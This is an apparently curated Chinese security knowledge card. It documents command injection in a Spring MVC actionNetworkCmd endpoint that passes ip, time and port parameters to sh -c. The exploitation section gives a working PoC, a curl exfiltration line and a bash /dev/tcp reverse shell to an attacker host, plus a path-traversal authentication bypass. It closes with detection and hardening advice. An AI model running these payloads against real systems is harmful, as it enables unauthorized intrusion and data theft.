---
id: web-java-rce-spring-actionnetworkcmd-ip-time-sh-c
title: Spring MVC actionNetworkCmd 将 ip/time 拼入 sh -c：分号截断的 ping/iperf 命令注入
type: scenario
domain: web
path: web/java/rce
technique: spring-controller-param-sh-c-command-injection
aliases:
- actionNetworkCmd 命令注入
- ip 参数命令注入
- time 参数命令注入
- execCentosCmd
- MyThread 命令执行
- ping 参数注入
tags:
- java
- spring-mvc
- command-injection
- runtime-exec
- sh-c
- ping
- iperf3
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:00:30+08:00'
  notes: 已对照原文与截图核对：actionNetworkCmd 取 ip/time/port 拼接，execCentosCmd 用 Runtime.exec({"sh","-c",cmd})，MyThread 调用链与 type=0/1/2 分支和原文一致；原文仅给 PoC 未展示执行回显，未在本机复现；type=2 的 time 在 cmd 拼接后仍会 Integer.parseInt，非数字会中断，卡内已注明
---

## 一句话结论

Spring MVC 控制器的 `actionNetworkCmd` 从请求取 `ip`、`time`、`port` 等参数，直接拼进 `ping`/`iperf3` 命令字符串，再交给 `CMSTools.execCentosCmd()` 用 `Runtime.exec(new String[]{"sh","-c",cmd})` 执行；把 `ip` 设为 `1;id;` 即可截断原命令并执行任意 shell 命令。

## 原理

- 入口：`SystemController.actionNetworkCmd(HttpServletRequest, HttpServletResponse)` 读取 `type`、`ip`、`time`（type=2 还有 `port`），按 `type` 分支构造 `cmd`、`process`、`fileName`。
- 分支示例：`case 0` 使用 `ping`，`fileName=/usr/web/tmp/ping.log`；`case 2` 使用 `iperf3`，`cmd = "iperf3 -c " + ip + " -p " + port + " -i 1 -t " + time + ...`，`fileName=/usr/web/tmp/iperf3.log`。
- 随后 `new MyThread(process, cmd, fileName).start()`；`MyThread.run()` 调用 `CMSTools.execCentosCmd(process, cmd, fileName)`。
- `execCentosCmd` 的实现：
  - 若 `process` 非空，先 `Runtime.getRuntime().exec(new String[]{"sh","-c","killall " + process})`；
  - 若 `fileName` 存在则删除；
  - 最后 `Runtime.getRuntime().exec(new String[]{"sh","-c", cmd})`。
- `sh -c` 会让 shell 解释 `;`、`&&`、`|`、`$()`、反引号等元字符；`ip=1;id;` 使命令变成 `ping 1;id; ...`，先执行 ping 再执行 id。
- 整个链路没有对 `ip`/`time`/`port` 做 IP 格式、数字范围或字符白名单校验；`time` 在 type=2 分支会被 `Integer.parseInt` 限制为数字，但 `ip`、`port` 仍可注入，type=0 的 `time` 也可直接注入。
- 命令在应用进程权限下执行；若应用以 root/高权限运行，可直接读写系统文件或反弹 shell。

## 触发条件

- 目标存在该 `actionNetworkCmd` 接口（原文为某管理服务器，未公开产品名）。
- 接口可达：可能无需认证，或通过拦截器白名单 `contains` + `../` 路径穿越绕过（原文另述）。
- 目标为 Linux/Unix（代码用 `sh -c`、`killall`；Windows 分支 `File.separator` 判断会直接 return）。
- 应用进程有执行 `ping`/`iperf3`/`sh` 的权限。

## 利用步骤

1. 确认接口路径与参数：`/aaaaa/actionNetworkCmd.do?type=0&ip=...&time=...`。
2. 先发 `type=0&ip=127.0.0.1&time=1` 观察正常响应/日志，确认分支。
3. 注入：`ip=1;id;`、`time=1`；URL 编码分号为 `%3B`（若 WAF/容器要求）。
4. 读取响应或写文件；若无回显，用 `ip=1;curl http://attacker/$(id|base64);` 带外。
5. 反弹 shell：`ip=1;bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1';`。
6. type=2 时优先注入 `ip` 或 `port`；`time` 需为数字，避免 `parseInt` 抛异常。

## PoC

```http
GET /aaaaa/actionNetworkCmd.do?type=0&ip=1;id;&time=1 HTTP/1.1
Host: target
```

服务端实际执行：

```text
sh -c "ping 1;id; ..." 
```

原文 PoC：

```text
http://127.0.0.1/白名单接口/../aaaaa/actionNetworkCmd.do?type=0&ip=1;id;&time=1
```

（前半段为鉴权白名单绕过，使未授权请求到达控制器；若接口本身可达可省略。）

## 变体与关联

- `type=2` 的 iperf3 分支：`cmd = "iperf3 -c " + ip + " -p " + port + " -i 1 -t " + time + ...`，`ip`/`port` 均可注入；`time` 因 `Integer.parseInt` 受限。
- 其他把请求参数拼进 `sh -c` 的管理功能（网络诊断、日志清理、备份、服务重启）通常复用同一 `execCentosCmd`，可按同样方式审计。
- 与 [[web-java-rce-socket-revshell-stream-pump]] 的反弹 shell 载荷可组合；本卡前半段是 Web 参数注入，后半段是 shell 执行。
- 鉴权绕过模式见 [[web-generic-auth-jeewms-authinterceptor-whitelist-regex-contains-bypass]]（白名单 contains + `../` 路径穿越）；本文产品同构，故不重复建卡。

## 检测与防御

- 禁止把请求参数拼进 `Runtime.exec`/`ProcessBuilder`/`sh -c`；网络诊断应使用参数数组调用 `ping`/`iperf3`，并对 IP 做 `InetAddress` 解析、端口做 1–65535 整数校验、时间做范围校验。
- 若必须用 shell，先对参数做严格白名单（仅 `[0-9a-fA-F:.]` 的 IP 字符），shell 元字符一律拒绝；不要依赖 `replace(";","")` 等有损过滤。
- 管理接口加认证授权，不要仅靠拦截器白名单；修复白名单 `contains`/路径穿越问题。
- 以低权限用户运行应用，限制 `ping`/`iperf3` 能力（cap_net_raw 按需授予）。
- 检测：`actionNetworkCmd` 请求的 `ip`/`time`/`port` 含 `;`、`|`、`&`、`$(`、反引号、空格；应用进程异常派生子进程 `sh -c ping ...`；`/usr/web/tmp/*.log` 异常内容；外连反弹 shell 流量。
